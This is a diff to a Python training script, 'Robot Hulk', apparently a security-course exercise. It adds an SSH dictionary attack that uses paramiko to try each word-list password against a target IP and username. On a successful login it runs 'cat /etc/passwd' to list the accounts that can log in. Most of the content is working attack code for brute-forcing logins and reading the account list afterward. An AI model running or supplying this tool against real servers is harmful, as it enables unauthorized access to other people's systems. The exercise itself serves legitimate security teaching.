@@ -6,36 +6,30 @@
 # Purpose: Build an automated brute force wordlist
 #
 # REQUIREMENTS:
-# Create a script that prompts the user to select one of the following modes:
-#   Mode 1: Offensive; Dictionary Iterator
-#       - Accepts a user input word list file path and iterates through the word list, assigning the word being read to a variable.
-#       - Add a delay between words.
-#       - Print to the screen the value of the variable.
-#   Mode 2: Defensive; Password Recognized
-#       - Accepts a user input string.
-#       - Accepts a user input word list file path.
-#       - Search the word list for the user input string.
-#       - Print to the screen whether the string appeared in the word list.
+# Add to your Python brute force tool the capability to:
+#   Authenticate to an SSH server by its IP address.
+#   Assume the username and IP are known inputs and attempt each word on the provided word list until successful login takes place.
 #
-# REFERENCE:
-# For the Password Complexity Test: https://www.w3schools.com/python/python_ref_string.asp
 
 from time import sleep
+import paramiko
+# import getpass
 import os
 
 
 def menu():
     while True:
-        print("\n---------------------------")
-        print("|        Robot Hulk       |")
-        print("---------------------------")
-        print("| 1. Dictionary Iterator  |")
-        print("| 2. Search for Word      |")
-        print("| 3. Password Test        |")
-        print("| Q. Quit                 |")
-        print("---------------------------")
+        print("\n-------------------------------------")
+        print("|               Robot Hulk           |")
+        print("--------------------------------------")
+        print("| 1. Dictionary Iterator             |")
+        print("| 2. Search for Word                 |")
+        print("| 3. Password Complexity Test        |")
+        print("| 4. SSH vs Dictionary               |")
+        print("| Q. Quit                            |")
+        print("--------------------------------------")
         choice = input(" Enter menu option: ")
-        if choice in ["1", "2", "3"]:
+        if choice in ["1", "2", "3", "4"]:
             print()
             return choice
         elif choice.lower() == "q":
@@ -45,7 +39,7 @@ def menu():
             sleep(.5)
 
 
-def load_file():
+def load_print_dictionary():
     file_path = file_path_input()
     file_name = os.path.basename(file_path)
     password_list = []
@@ -55,6 +49,18 @@ def load_file():
             password_list.append(line.strip())
             print(line.strip())
             sleep(.3)
+
+
+def load_wordlist():
+    file_path = file_path_input()
+    file_name = os.path.basename(file_path)
+    password_list = []
+    print(f"\nLOADING {file_name}\n")
+    with open(file_path, 'r') as file:
+        for line in file:
+            password_list.append(line.strip())
+
+    return password_list
 
 
 def password_search():
@@ -142,9 +148,51 @@ def check_sym(password):
     return sym
 
 
+def ssh_attack():
+    ip = input("Enter IPv4 [Default: 192.168.1.18]: ") or "192.168.1.18"
+    print(f'Target: {ip}')
+    username = input("\nEnter username [Default: anakin]: ") or "anakin"
+    print(f'Username: {username}\n')
+    word_list = load_wordlist()
+
+    print("BEGINNING RUN")
+    for password in word_list:
+        res = ssh_attempt(ip, username, password)
+
+        if res == 0:
+            print(f'\n[*] User: {username} - Password Found: {password} ')
+            exit()
+        elif res == 1:
+            print(f'[*] User: {username} - Password: {password} - INVALID')
+
+
+def ssh_attempt(ip, username, password):
+    code = 0
+
+    ssh = paramiko.SSHClient()  # Initializes paramike's SSH client.
+
+    # Automatically adds host to ssh key policy, skipping the usual prompt when connecting to a new ssh host
+    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+    try:
+        ssh.connect(ip, 22, username, password)
+
+        stdin, stdout, stderr = ssh.exec_command(
+            "cat /etc/passwd | grep -v 'nologin'")
+        sleep(.5)
+        output = stdout.read()
+        decoded_output = output.decode('utf-8')
+        print(f'\n{decoded_output}')
+    except paramiko.AuthenticationException:
+        code = 1
+
+    ssh.close()
+    return code
+
+
 if __name__ == "__main__":
     choice = menu()
     match choice:
-        case "1": load_file()
+        case "1": load_print_dictionary()
         case "2": password_search()
         case "3": password_complexity()
+        case "4": ssh_attack()
